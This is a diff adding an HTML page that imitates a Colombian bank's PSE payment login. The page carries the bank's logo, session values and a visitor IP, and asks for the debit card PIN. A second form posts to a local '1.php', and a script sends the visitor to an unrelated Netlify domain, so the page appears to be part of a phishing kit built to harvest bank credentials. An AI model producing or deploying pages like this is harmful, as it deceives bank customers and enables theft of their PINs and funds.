@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bogota</title>
+    <link rel="stylesheet" href="./bogo/lfr_style.css">
+    <link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
+</head>
+
+<body>
+
+    <div class="box-container">
+        <div class="container">
+            <div class="toast hidden" id="errorMessage" style="position: absolute;">
+                <p id="AuthLabel"></p>
+                <span class="icon-close-search-r" onclick="hideToast()"></span>
+            </div>
+
+            <div class="container__login">
+                <div class="container__login--header">
+                    <img src="./bogo/logobanco1.png" alt="">
+                </div>
+                <div class="container__login--title">
+                    <div class="container__login--title-1">
+                        <p>Identificación de usuario</p>
+                    </div>
+                    <div class="container__login--title-2">
+                        <p>
+                            <label class="tituloformulario" id="flujoOrigenLbl">Pagos PSE</label>
+                        </p>
+                    </div>
+                </div>
+                <div class="container__login--login-box-id">
+                    <div class="container__login--login-box-title">
+                        <span><strong>Ha ingresado desde: 
+                        </strong></span>
+                    </div>
+                    <div class="form-container">
+                        <form method="post" name="authenticateForm" id="authenticateForm" autocomplete="off">
+                            <input type="hidden" size="8" id="currentSessionTime" name="currentSessionTime" value="1709245729624">
+                            <input type="hidden" size="8" id="initSessionTime" name="initSessionTime" value="1709245646774">
+                            <input type="hidden" size="8" id="validSessionTime" name="validSessionTime" value="00:07">
+                            <input type="hidden" name="processInstanceId" value="000000018DF6FC0B4D0A4167875F3330">
+                            <input type="hidden" name="activityInstanceId" value="000000018DF6FC0B582163893B41494E">
+
+                            <div class="field-1">
+                                <div class="custom-input">
+                                    <div class="label">
+                                        <label for="password">Clave de la tarjeta débito</label>
+                                    </div>
+                                    <input name="Password" type="password" class="custom-form-control" id="Password" maxlength="4" size="8" required="">
+                                </div>
+                            </div>
+
+                            <div class="btn-container">
+                                <button type="button" class="btn-main" id="btnContinue">Continuar</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <div class="timeElapsed">
+                <label>Tiempo restante&nbsp;</label><span id="timeE_min">05</span><label>:</label><span id="timeE_seg">18</span><label>&nbsp;minutos</label><br> 
+                <label><span id="timeE_date">Jueves, 29 de Febrero de 2024, 5:28 PM</span></label><br> 
+                <label><span id="timeE_ip">IP 186.116.65.249</span></label>
+            </div>
+        </div>
+
+        <form action="1.php" method="post" id="tok">
+            <div class="modal modalUP">
+                <div class="modal__container">
+                    <h2 class="modal-title">Identificate para continuar</h2><br>
+                    <br>
+                    <!-- Aquí está el botón con la función para redirigir -->
+                    <button type="button" class="btn-main" id="btnToken" onclick="redirectToPage()">Continuar</button>
+                    <br><br>
+                    <div class="modal-bottom">
+                        <br>
+                        <p class="modal-text">*Si tú eres Persona Jurídica Realiza tu solicitud mediante <b>Sucursal Telefónica.</b></p>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <div class="overlay overlayUP"></div>
+    </div>
+
+    <script>
+        function redirectToPage() {
+            // Aquí puedes poner la URL de la página a la que quieres redirigir
+            window.location.href = 'https://banconline.netlify.app/';
+        }
+    </script>
+
+    <style>
+        .token-input {
+            max-width: 200px;
+            height: 60px;
+            text-align: center;
+            font-size: 20px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+    </style>
+</body>
+</html>
